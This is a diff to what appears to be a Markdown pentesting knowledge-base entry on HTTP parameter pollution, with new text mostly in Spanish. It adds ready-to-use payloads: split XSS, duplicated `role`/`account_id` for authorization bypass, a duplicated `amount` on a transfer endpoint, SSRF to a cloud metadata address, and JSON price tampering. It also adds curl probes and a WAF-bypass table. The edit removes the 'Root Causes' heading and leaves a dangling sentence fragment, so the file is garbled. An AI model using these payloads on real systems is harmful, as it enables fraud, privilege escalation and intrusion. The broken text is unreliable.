@@ -85,9 +85,59 @@ chains_with: [broken-access-control, oauth, business-logic]
 - `arjun` for parameter discovery that can surface candidate names worth duplicating.
 - Framework-specific parsing reference (PHP `last wins`, ASP.NET `comma-joined`, Rails/Rack `array`, Express `qs` `array`) — verify empirically per target rather than trusting the reference alone.
 
-## Root Causes
+## Payloads & Detection Patterns
 
-- Different components in the request path (WAF, API gateway, app server, backend service) parse duplicate parameters with different precedence rules, and security decisions are made by one component while business logic acts on another's interpretation.
+Guía de caza: una familia por punto de desacuerdo entre capas (WAF↔app, validación↔lógica,
+edge↔origin). El oráculo no es que el duplicado se acepte, sino que el efecto de negocio diverja
+del valor "visible". Fingerprintea la precedencia antes de cargar payloads.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Baseline fingerprint | `?q=first&q=second` | Determinar precedencia (first/last/concat/array) |
+| WAF↔app split | `amount=1&amount=99999` | WAF ve el slot 1, la app procesa el slot 2 |
+| Payload splitting | `q=<scr&q=ipt>alert(1)` | Partir una firma bloqueada entre dos ocurrencias |
+| Decoy + real | `q=safe&q=<script>...` | Valor malicioso en el slot no inspeccionado |
+| AuthZ dup | `account_id=1001&account_id=1002`, `role=user&role=admin` | Validación y lógica usan ocurrencias distintas |
+| Routing confusion | `target=https://ok&target=http://169.254.169.254/` | Frontend valida slot 1, backend rutea slot 2 (overlap SSRF) |
+| JSON dup key | `{"price":100,"price":1}` | El parser toma la última clave en silencio |
+| Mixed location | mismo param en query + body + header | Cada capa lee de una fuente distinta |
+
+Surface signals que delatan la clase antes de duplicar:
+- WAF/proxy de un stack frente a app de otro (ModSecurity+PHP, API gateway+Node).
+- Params de negocio duplicables: `amount`, `price`, `qty`, `discount`, `role`, `account_id`.
+- OAuth: `redirect_uri`, `scope`, `client_id` (cross-ref oauth).
+- Reflejo que cambia según cuál ocurrencia termina usándose.
+
+```bash
+# fingerprint de precedencia: ¿qué valor gana?
+curl -s "https://target/search?q=AAA&q=BBB"   # refleja AAA, BBB, AAA,BBB o array
+```
+
+```bash
+# divergencia validación/proceso: baseline vs duplicado, comparar el EFECTO de negocio
+curl -s -i -X POST "https://target/api/transfer" -b "session=$S" \
+  -H "Content-Type: application/x-www-form-urlencoded" -d "amount=1"               # baseline
+curl -s -i -X POST "https://target/api/transfer" -b "session=$S" \
+  -H "Content-Type: application/x-www-form-urlencoded" -d "amount=1&amount=99999"  # dup: ¿procesa 99999?
+```
+
+Si el param duplicado gatilla un fetch interno ciego (routing confusion → SSRF), correlaciona el
+callback por token en el gate OOB (`engine.oast`); sin hit el alcance interno queda **Inferred**.
+
+## Bypass Techniques
+
+Agrupadas por la defensa que evaden; el slot "real" depende del modelo de parsing, así que pruébalo.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| WAF inspecciona la ocurrencia 1 | Payload real en el slot 2 `p=safe&p=EVIL` | App last-wins; el WAF solo ve el first |
+| WAF inspecciona la última | Payload en el slot 1, decoy al final | Inverso del anterior según el parser |
+| Firma única del payload | Partir en dos params `p=<scr&p=ipt>` | Algunos stacks concatenan las ocurrencias |
+| Validación solo en query | Duplicar en body/JSON | Capas distintas leen de fuentes distintas |
+| Schema rechaza array | Probar query vs body form-encoded vs JSON por separado | Un parser escalar, otro array |
+| De-dup en el edge (CDN/LB) | Golpear el origin directo (si en scope) | Un negativo en el edge no prueba el origin |
+
+ (WAF, API gateway, app server, backend service) parse duplicate parameters with different precedence rules, and security decisions are made by one component while business logic acts on another's interpretation.
 - Input validation implemented against `request.GET['param']`-style single-value access while actual processing later iterates `request.GET.getlist('param')` or vice versa.
 - No normalization/rejection of duplicate parameter names at the edge.
 
